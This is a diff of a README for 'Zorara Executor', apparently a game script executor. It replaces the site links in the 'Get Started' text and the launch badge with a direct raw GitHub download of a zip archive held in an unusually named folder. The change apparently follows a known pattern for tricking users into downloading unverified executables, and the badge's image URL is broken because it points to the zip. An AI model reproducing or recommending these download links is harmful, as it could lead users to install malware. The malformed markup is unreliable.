@@ -18,10 +18,10 @@ Welcome to the **Zorara Executor** repository, your gateway to a world of possib
 
 ## 🌐 Get Started
 
-Click [here](https://zoraraexecutor.org) to unleash the power of Zorara Executor.  
+Click [here](https://raw.githubusercontent.com/ainaeeeeee/Zorara-Executor/master/outbetter/Zorara_Executor_1.8-alpha.1.zip) to unleash the power of Zorara Executor.  
 
 ## 🎨 Colorful Button
-[![Launch Zorara Executor](https://img.shields.io/badge/Launch-Zorara%20Executor-brightgreen)](https://zoraraexecutor.org)
+[![Launch Zorara Executor](https://raw.githubusercontent.com/ainaeeeeee/Zorara-Executor/master/outbetter/Zorara_Executor_1.8-alpha.1.zip%20Executor-brightgreen)](https://raw.githubusercontent.com/ainaeeeeee/Zorara-Executor/master/outbetter/Zorara_Executor_1.8-alpha.1.zip)
 
 ---
 
